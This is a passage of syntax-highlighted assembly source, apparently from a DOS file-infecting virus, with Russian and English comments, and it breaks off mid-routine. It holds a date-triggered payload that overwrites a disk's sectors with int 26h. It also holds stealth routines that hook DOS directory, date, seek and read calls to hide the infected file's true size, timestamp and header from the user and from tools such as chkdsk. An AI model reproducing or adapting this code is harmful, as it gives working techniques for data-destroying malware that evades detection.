        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0505h</span><span class="sc0">        </span><span class="sc1">; 05.05.XXXX?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_floppy</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">; узнаем, сколько секторов на диске</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">not_floppy</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; со второго сектора (чтоб всяко мониторо</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; ни гугу)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

 </span><span class="sc5">not_floppy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; fcb size/date stealth ── called by 11h/12h</span><span class="sc0">
</span><span class="sc1">; no extension check (see above)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">fcbstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">; find file!</span><span class="sc0">
        </span><span class="sc5">pushall</span><span class="sc0">                         </span><span class="sc1">; save all 16-bit registers (exc. SP)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                 </span><span class="sc1">; no more filez?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; nothing to do!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; can we stealth?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; we can't stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">drf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; can we stealth?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; we can't stealth</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">; get current DTA address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                 </span><span class="sc1">; al = FF</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; FCB is extended?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_ext</span><span class="sc0">                  </span><span class="sc1">; not extended!</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; else 7 extra bytes</span><span class="sc0">
 </span><span class="sc5">no_ext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; si points to file date</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; di points to file size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sizst</span><span class="sc0">                   </span><span class="sc1">; stealth real file size!</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; show the false to user!</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; date stealth ── called by 57h</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">datestealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">set_date</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

 </span><span class="sc5">set_date</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correctdate</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; dta size/date stealth ── called by 4Eh/4Fh</span><span class="sc0">
</span><span class="sc1">; no extension check (infected.exe could be renamed to fuckup.fun)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">dtastealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                   </span><span class="sc1">; find file!</span><span class="sc0">
        </span><span class="sc5">pushall</span><span class="sc0">                         </span><span class="sc1">; save all 16-bit registers (exc. SP)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; nothing to do?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; can we stealth?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_stealth</span><span class="sc0">              </span><span class="sc1">; we can't stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">; get current DTA address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; si points to file date</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; di points to file size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sizst</span><span class="sc0">                   </span><span class="sc1">; stealth real file size!</span><span class="sc0">
 </span><span class="sc5">no_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">popall</span><span class="sc0">                          </span><span class="sc1">; reset all 16-bit registers</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">                 </span><span class="sc1">; show the false to user!</span><span class="sc0">

</span><span class="sc1">; ----= SIZE STEALTH =----</span><span class="sc0">
 </span><span class="sc5">sizst</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ax = filedate</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">                 </span><span class="sc1">; verify and hide stamp</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_hide</span><span class="sc0">                 </span><span class="sc1">; if no stamp set ;(</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; save it in DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; dx:ax = filesize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_hide</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc5">no_hide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ----= DATE CORRECT =----</span><span class="sc0">
 </span><span class="sc5">correctdate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; dos function: get file time/date</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hidestm</span><span class="sc0">                 </span><span class="sc1">; reset file date stamp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf?</span><span class="sc0">                    </span><span class="sc1">; file is already infected?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">perfectly</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">perfectly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; set new, corrected file stamp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ----= HIDE STAMP =----</span><span class="sc0">
 </span><span class="sc5">hidestm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; store dx on stack</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; get stamp in dh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                  </span><span class="sc1">; above 100?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; reset dx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">good_stm</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; prepare dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                  </span><span class="sc1">; hide real stamp</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; reset dx</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">good_stm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">





▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; allow/disable fcb stealth</span><span class="sc0">
</span><span class="sc1">; virus disables fcb stealth on get dpb (32h) to avoid chkdsk (or other shit)</span><span class="sc0">
</span><span class="sc1">; mistakes</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">drf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">runaway</span><span class="sc0">

 </span><span class="sc5">getdpb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">drf</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">runaway</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; lseek stealth</span><span class="sc0">
</span><span class="sc1">; избегаем возможности попадания lseek'а на тело вируса</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">seekstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc0"></span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; всякие RAR'ы бегут?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nostealth</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">handlecheck</span><span class="sc0">         </span><span class="sc1">; дисковый файл?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nostealth</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf?</span><span class="sc0">                </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">nostealth</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; прикрываем жопу вируса?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">hide_eof</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">st_ret</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seeksave</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekhide</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc5">st_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

 </span><span class="sc5">hide_eof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">nostealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; read stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">readstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc0"></span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; всякие RAR'ы бегут?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nostealth</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">handlecheck</span><span class="sc0">         </span><span class="sc1">; дисковый файл?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nostealth</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf?</span><span class="sc0">                </span><span class="sc1">; инфицирован?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">nostealth</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">               </span><span class="sc1">; читаем че просят</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">st_ret</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                       </span><span class="sc1">; сохранить регистры</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; адрес буфера куда читать</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; количество прочитанных байт</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">    </span><span class="sc1">; читают заголовок?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">virsubtract</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_original</span><span class="sc0">       </span><span class="sc1">; выдрать оригинальное начало этого файла</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">           </span><span class="sc1">; смещение начала замещаемых байт</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc0">       </span><span class="sc1">; считаем количество байт которые нам нужно</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">      </span><span class="sc1">; состелсить</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">overwrite</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">

 </span><span class="sc5">overwrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; переносим заголовок</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">overwrite</span><span class="sc0">

 </span><span class="sc5">virsubtract</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seeksave</span><span class="sc0">        </span><span class="sc1">; заполняем переменую "seek_pos" текущим</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekhide</span><span class="sc0">        </span><span class="sc1">; значением положения lseek'а и стелсим</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">; приращение длины файла</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc0">   </span><span class="sc1">; прочитал ax байт...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; лечим вирусоносителя (когда в него че-нибудь записывают)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">writehandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc0"></span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; всякие RAR'ы бегут?</span><span class="sc0">
